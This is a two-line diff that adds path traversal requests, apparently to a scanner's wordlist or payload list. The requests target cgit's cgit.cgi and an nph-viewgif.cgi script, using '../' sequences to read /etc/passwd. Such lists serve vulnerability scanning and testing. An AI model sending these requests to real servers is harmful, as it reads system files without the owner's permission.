@@ -1,0 +1,2 @@
+/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd
+/blast/nph-viewgif.cgi?../../../../etc/passwd
